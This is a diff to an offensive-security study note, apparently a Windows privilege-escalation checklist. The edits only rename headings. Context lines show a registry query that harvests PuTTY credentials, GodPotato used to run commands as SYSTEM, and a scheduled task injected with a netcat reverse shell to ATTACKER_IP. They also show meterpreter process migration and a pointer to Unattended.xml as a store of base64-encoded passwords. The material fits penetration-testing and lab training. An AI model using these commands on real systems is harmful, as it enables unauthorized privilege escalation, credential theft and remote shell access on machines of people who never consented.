@@ -4,7 +4,7 @@ summary: Privilege Escalation step – a note for elevating privileges on a Wind
 description: Privilege Escalation step – a note for elevating privileges on a Windows machine.
 ---
 
-# Privesc Checklist
+# Windows Privesc Checklist
 
 ---
 
@@ -42,7 +42,7 @@ description: Privilege Escalation step – a note for elevating privileges on a 
  > **<font color=red>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s</font>**</br>
  > Look for Putty credentials in registers (SimonTatham is PuTTY’s creator).
 
-# Automated Scripts
+# Windows Automated Scripts
 
 ---
 
@@ -127,7 +127,7 @@ WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\
 
 **https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon**
 
-# Potato Privesc
+# Windows Privesc Potato
 
 ---
 
@@ -148,7 +148,7 @@ https://github.com/BeichenDream/GodPotato/releases
  > <font color=red>GodPotato -cmd "</font>cmd /c whoami<font color=red>"</font>
  > Privesc and run `whoami` as `NT AUTHORITY\SYSTEM`.
 
-# Abusing Schtasks
+# Windows Privesc Abusing Schtasks
 
 ---
 
@@ -179,7 +179,7 @@ https://github.com/BeichenDream/GodPotato/releases
  > **<font color=red>echo</font> c:\\tools\\nc64.exe <font color=red>-e cmd.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>\> C:\\tasks\\schtask.bat</font>**</br>
  > Inject scheduled task with reverse shell.
 
-# Abusing Privileges
+# Windows Privesc Abusing SE Privileges
 
 ---
 
@@ -221,7 +221,7 @@ The safest to pick is **services.exe**.
  > **<font color=red>migrate</font> 668**</br>
  > Migrate to process 668.
 
-# Unattended Path
+# Windows Privesc Unattended Path
 
 Unattended Setup is the method by which OEMs (Original Equipment Manufacturers) install Windows NT in unattended mode.
 C:\\Windows\\Panther\\Unattend\\Unattended.xml is where users' passwords are stored in base64. 
